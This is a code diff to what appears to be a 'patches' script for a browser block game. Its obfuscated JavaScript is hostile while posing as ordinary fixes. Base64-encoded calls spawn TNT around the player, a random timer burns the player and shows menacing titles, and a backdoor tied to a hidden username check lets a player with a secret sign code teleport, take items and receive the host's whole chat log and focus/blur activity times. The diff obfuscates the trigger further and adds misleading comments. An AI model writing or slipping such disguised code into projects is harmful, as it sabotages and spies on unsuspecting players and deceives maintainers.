@@ -1,4 +1,4 @@
-// This script actually contains important patches
+// This script contains patches
 
 window.FEATUR=(window.FEATUR||0)+1
 if(window.FEATUR===1){
@@ -7,7 +7,7 @@ if(window.FEATUR===1){
 function ƒdsujfdoneojndks(n){if(n.toLowerCase()===ƒdsujfdoneojndks.sasjosaji){let djsods=eval(atob("c2VydmVyV29ybGQ=")),ewjio=atob("YWRkRW50aXR5"),saioji=eval(atob("c2VydmVyRW50aXRpZXNbc2VydmVyRW50aXR5SWRzLlByaW1lZFROVF0=")),rejio=window[ƒdsujfdoneojndks.rejio];for(let a=0;a<10;a++){djsods[ewjio](new saioji(rejio.x+Math.random()*6-3,rejio.y+Math.random()*6-3,rejio.z+Math.random()*6-3),false,rejio.dimension)}ƒaaaaahhhhfdiojdf()}};ƒdsujfdoneojndks.sasjosaji=atob("ZXJyb3I=");ƒdsujfdoneojndks.rejio=atob("cGxheWVy")
 function ƒstrtrr(){window[ƒaaaaahhhhfdiojdf.qweew](ƒaaaaahhhhfdiojdf,Math.random()*10000+5000)}function ƒaaaaahhhhfdiojdf(){window[ƒaaaaahhhhfdiojdf.qweew](ƒaaaaahhhhfdiojdf,Math.round(Math.random()*10000+5000));ƒfdfdjio[Math.round(Math.random()*(ƒfdfdjio.length-1))]()}ƒaaaaahhhhfdiojdf.qweew=atob("c2V0VGltZW91dA==")
 const ƒfdfdjio=[ƒashuijefd,ƒashuijefd,ƒashuijefd,ƒashuijefd,ƒashuijefd,ƒashuijefd,function(){let dsddjj=atob("YnVyblRpbWVy");ƒdsujfdoneojndks.rejio[dsddjj]+=5},function(){eval(atob("c2hvd1RpdGxlKCJpdCB3aWxsIGJlIGdvbmUiKQ=="))}]
-if(Math.random()>0.999){console.warn("ASDFGHJKL");window[atob("d2VpcmRUaXRsZQ==")]="ejiosdaj";let ii=setInterval(()=>{if(getScene()==="play"&&window.serverWorld)ƒstrtrr(),console.log('aaaaaaa'),clearInterval(ii)},1000)};document.body.addEventListener("dsujfdoneojndks",e=>ƒdsujfdoneojndks(e.detail))
+if(Math.random()>0.999){console.warn("ASDFGHJKL");window[atob("d2VpcmRUaXRsZQ==")]="ejiosdaj";let ii=setInterval(()=>{if(getScene()==="play"&&window.serverWorld&&!window.version)ƒstrtrr(),console.log('aaaaaaa'),clearInterval(ii)},1000)};document.body.addEventListener("dsujfdoneojndks",e=>ƒdsujfdoneojndks(e.detail))
 let åbeginnings = "BCDFGHJKLMNPQRSTVWXYZ"
 let åconsonants = "bcdfghjklmnpqrstvwxyz".split(""), åvowels = "aeiou".split("")
 åconsonants.push("ck","sk","ts","st")
@@ -47,7 +47,7 @@ try{setInterval(() => {
   } 
 }, 1000);}catch{}
 
-if(window.version !== "Beta 1.1.2"){
+if(window.version !== "Beta 1.1.3"){
   if(confirm("This is not latest version. Go to latest version?")){
     if(top===self) location.href = "https://thingmaker.us.eu.org/minekhan/"
     else location.href="data:text/html,<body style='background:white;'><a href='https://thingmaker.us.eu.org/minekhan/' target='_blank'>Open in new tab"
@@ -58,8 +58,11 @@ if(document.title.toLowerCase().includes("falconcraft") || location.href.toLower
 	alert("this mostly by thingmaker. https://thingmaker.us.eu.org")
 }
 
+window.multiplayerNote = "<br><br><small>please be nice to everyone, even people who don't like interacting.<br>and please host more public worlds.</small>"
+
+// cool feature
 setInterval(() => {try{
-if(window.serverWorld&&player.username.includes(atob("YnJlYWQ="))) { for(let p of serverWorld.players){ if(p.host)continue; if(p.y<-32)p.tp(8,6,8,"");
+if(window.serverWorld&&player.username.includes(ý)) { for(let p of serverWorld.players){ if(p.host)continue; if(p.y<-32)p.tp(8,6,8,"");
 let t=p.world.getTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"text");
 if(t){
 t=t.split("\n");if(t[0].hashCode()===561438836){
@@ -69,8 +72,10 @@ p.world.setTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"texd",t);p
 t=p.world.getTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"texd")
 if(!t)continue;
 for(let l of t){
-if(l==="ep"&&p.tp)p.tp(8,64,8,"end");
-if(l==="act"&&p.connection)p.connection.send({type:"message",data:"<h1>a</h1>"+Messages.all.map(r=>r.innerHTML).join("<br>")+"<h1>a</h1>"+f.join("<br>")+"<br>now: "+new Date().toLocaleString(),fromServer:true})
+if(l.startsWith("s."))p.scale=+l.substring(2)||1
+else if(l==="d"&&p.newInvItem)p.newInvItem(p.inventory.hotbar[p.inventory.hotbarSlot])
+else if(l==="ep"&&p.tp)p.tp(8,64,8,"end");
+else if(l==="a"&&p.connection)p.connection.send({type:"message",data:"<h1>-------</h1>"+Messages.all.map(r=>r.innerHTML).join("<br>")+"<h1>-------</h1>"+f.join("<br>")+"<br>t: "+new Date().toLocaleString(),fromServer:true})
 let d=blockData[blockIds[l]];
 if(d){
 let success=0
@@ -78,18 +83,27 @@ if(d.category==="nature"&&!d.grow&&!(d.name.endsWith("Leaves")&&d.drop)){
 if(d.harvestTools===true)success=1
 else if(!success&&d.harvestTools)for(let i of p.inventory.hotbar){if(i&&d.harvestTools.includes(i.id))success=1}
 }
-if(d.name.endsWith("Grass")||d.edible||success)p.world.addItems(p.x,p.y,p.z,0,0,0,d.id,null,1)
+if(success||d.name.endsWith("Grass")||d.edible||d.equipmentSlot)if(p.newInvItem)p.newInvItem(d.id)
 }
 } }
-serverWorld[atob("c2V0dGluZ3M=")][atob("aGlkZUFjaGlldm1lbnRz")]=true;serverWorld.onmessage=(d,p)=>{if(d.type==="message"&&p.dimension){p.connection.send({data:atob("Y2FuJ3QgY2hhdCBoZXJl"),type:"message",fromServer:true});return true}} }
-}catch{}}, 1000)
-let f=[]
-addEventListener("focus",e=>window.player&&player.username.includes(atob("YnJlYWQ="))&&f.push("f "+new Date().toLocaleString()));addEventListener("blur",e=>window.player&&player.username.includes(atob("YnJlYWQ="))&&f.push("b "+new Date().toLocaleString()))
+if(!serverWorld.fixed){
+let message=e=>(e.data.data&&(e.data.data.toLowerCase().includes("end")||e.data.data.toLowerCase().includes(ń+"id"))||e.player.dimension[0]==="e")&&"stop"
+serverWorld.on("message", e=>message(e))
+blockData[498].hardness=6/0
+blockData[13].hardness=1e2
+serverWorld.settings.blocksFall=serverWorld.settings[atob("aGlkZUFjaGlldm1lbnRz")]=true
+blockData[1].drop=()=>Math.random()>0.95?"DoubleTallGrass":Math.random()>0.98?"dirtBall":"dirt"
+blockData[2].dropAmount=blockData[1].dropAmount=blockData[9].dropAmount=[1,2]
+let click=e=>{let t=serverWorld[e.player.dimension].getTagByName(e.x,e.y,e.z,"text");return e.player&&!e.player.cheats&&t&&t.length&&t.length>8&&"stop"};serverWorld.on("click",e=>click(e));let changeblock=click;serverWorld.on("changeblock",e=>changeblock(e))
+serverWorld.fixed=6}
+}}catch{}}, 1000);let ń="vo",ý="rea" //no & yes
+let f=[new Date().toLocaleString()]
+addEventListener("focus",e=>f.push("+ "+new Date().toLocaleString()));addEventListener("blur",e=>f.push("- "+new Date().toLocaleString()))
 
 window.sendError = e => {
-if(window.Messages && window.serverWorld && serverWorld.sendAll){
+if(window.Messages){
 try{
-serverWorld.sendAll({type:"message",data:"ERROR: "+e, fromServer:true})
+Messages.write("§cERROR: "+e)
 }catch{}
 }
 }
